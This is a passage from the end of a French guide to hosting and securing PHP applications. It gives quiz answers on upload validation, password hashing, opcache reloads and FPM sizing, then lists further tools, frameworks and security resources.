> C'est le **client** qui l'envoie, donc falsifiable. Il faut détecter le vrai type avec `finfo` côté serveur, avec une whitelist.

**Q7.** `md5($password)` : pourquoi est-ce à bannir, et par quoi le remplacer ?
> MD5 est ultra-rapide et cassé : un GPU teste des milliards de hash/s. Remplacer par `password_hash()` (bcrypt/Argon2 : lent, salé) + `password_verify()`.

**Q8.** Après un déploiement avec `opcache.validate_timestamps=0`, que faut-il faire et pourquoi ?
> `systemctl reload php8.4-fpm` : avec `validate_timestamps=0`, PHP ne revérifie jamais les fichiers, donc l'ancien bytecode resterait servi sans reload.

**Q9.** Comment dimensionner `pm.max_children` ?
> `(RAM totale − RAM OS − RAM BDD − marge) / RAM moyenne d'un worker` (mesurée via `ps`). Trop haut = swap/OOM, trop bas = file d'attente.

**Q10.** Citer 3 choses que fait bien le formulaire de contact de la section 72.
> Token CSRF, validation serveur stricte (whitelist), pattern PRG, honeypot anti-bot, stockage brut + `htmlspecialchars` à l'affichage, en-têtes mail sans injection CRLF. (3 parmi celles-ci.)

---

## 81. Pour aller plus loin

**Qualité de code**
- **PHPStan / Psalm** : analyse statique (détecte les bugs sans exécuter) — `composer require --dev phpstan/phpstan`
- **PHP-CS-Fixer** : formattage automatique au standard PSR-12
- **Rector** : migrations automatiques (7.4 → 8.x) et modernisation du code
- **PHPUnit / Pest** : tests automatisés — viser d'abord les fonctions critiques (calculs, validation)

**Frameworks (quand l'appli grandit)**
- **Symfony** : le standard entreprise (composants réutilisables : Mailer, Validator, Console)
- **Laravel** : productivité maximale, écosystème riche
- Règle : un framework ne dispense pas de comprendre ce guide (config, sécurité, FPM).

**Performance avancée**
- **RoadRunner / FrankenPHP** : serveurs d'applications PHP (workers persistants, sans FPM)
- **Swoole** : PHP asynchrone (websockets, haute concurrence)
- Cache applicatif : **Redis** (sessions, résultats, files avec ` predis/predis`)

**Sécurité avancée**
- **2FA TOTP** : `robthree/twofactorauth`
- **Content-Security-Policy** stricte + `nonce` par requête
- Audit : **OWASP ZAP** en CI sur l'environnement de staging
- Veille : s'abonner aux alertes CVE PHP (`composer audit` en cron hebdo)

**Documentation officielle (référence)**
- php.net/manual/fr — la doc de référence (exemples + commentaires)
- php.net/supported-versions — calendrier de fin de vie des versions (ne jamais rester sur une version EOL)
- OWASP Cheat Sheet Series — fiches sécurité par sujet

**Idée de progression pour Zelef :** prendre une petite appli interne (ex. : suivi d'interventions) et lui appliquer ce guide de bout en bout — installation, durcissement, CRUD PDO, supervision. C'est en hébergeant « pour de vrai » que les réflexes deviennent automatiques.

---

*Fin du guide — bon code, et surtout : logs propres, backups testés, PHP à jour.* 🐘
